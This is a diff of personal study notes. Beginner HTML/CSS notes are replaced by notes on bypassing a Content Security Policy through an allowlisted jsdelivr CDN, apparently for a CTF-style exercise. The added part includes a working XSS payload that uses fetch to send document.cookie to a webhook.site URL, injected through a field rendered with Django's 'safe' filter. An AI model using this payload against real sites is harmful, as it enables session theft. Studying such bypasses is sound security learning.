@@ -1,73 +1,40 @@
-.navbar_toggle#mobile-menu (creating the class and id at the same time)
+CSP (Content Security Policy)
+-------------------------------
 
-it displays like that
---------------------- 
+CSP allows website administrators to define and enforce a set of rules that dictate which sources of content can be considered trustworthy and should be executed or displayed by the browser.
 
-<div class="nav_toggle" id="mobile-menu"></div>
+CSP can be seen in the Response header 
+e.g. Content-Security-Policy:script-src 'self' https://cdn.jsdelivr.net ;
 
+script-src 'self' https://cdn.jsdelivr.net directive allows JavaScript to be executed from both the same origin (the domain of the web page) and the specified CDN domain (https://cdn.jsdelivr.net). 
 
-ul.navbar_item
----------------
+Can also check CSP rules in CSP Evaluator(https://csp-evaluator.withgoogle.com/)
 
-<ul class="navbar_item"></ul>
+****Using https://cdn.jsdelivr.net can be dangerous***** because we can fetch javascript code from our github.
 
-Internal CSS ()
+https://cdn.jsdelivr.net/gh/user/repo@version/file (original)
+https://cdn.jsdelivr.net/gh/AlPha0ne1/holloween/project.js (from my github)
+
+Use webhook.site to get a redirect data.
+
+In project.js
 -------------
+fetch('https://webhook.site/a88e1bf7-4c89-4b11-915f-46b421280985?cookie=' + document.cookie);
 
-<style>
+In website name (using safe)
+----------------
+<script src = "https://cdn.jsdelivr.net/gh/AlPha0ne1/holloween/project2.js"></script>
 
-h1,p
-{
-color: black;
-background-color: yellow;
-}
-</style>
-
-h1 and p = selectors; 
-background-color: yellow = rule;
-background-color = property;
-yellow =value;
-
-<em> tags as italicized
-<b> tag is used to make text bold
-
-<head>
-  <style>
-    h1 u {
-      color: seagreen;
-    }
-  </style>
-</head>
-<body>
-  <h1>Back to <u>school!</u></h1>
-  <p>Our back to <u>school</u> sale from July 15th.</p>
-</body>
-
-color:seagreen affects only u selector in h1 not the whole h1.
-
-id  = unique element
-class = multiple elements
-
-<h1 class=demo>Hi</h1>
-<p class=demo> How are you </p>
-
-h1.demo
-{
-  color:red;
-  font-size:large;
-}
-p.demo
-{
-  background-color:red;
-  background-size: 100%
-}
+https://cdn.jsdelivr.net/gh/AlPha0ne1/holloween/project2.js > webhook.site > get cookie.
 
 
+______________________________________________________________________________________________________________________
 
 
+In admin.html
+<div class="card-header"> <strong>Halloween Name</strong> : {{ request.halloween_name | safe }} </div>
 
+1. The {{ request.halloween_name | safe }} part is using the safe filter, indicating that the content of 
+   request.halloween_name is trusted and can contain HTML markup.
 
-
-
-
-
+2. When user inputs or untrusted data are marked as safe, it can lead to Cross-Site Scripting (XSS) vulnerabilities.
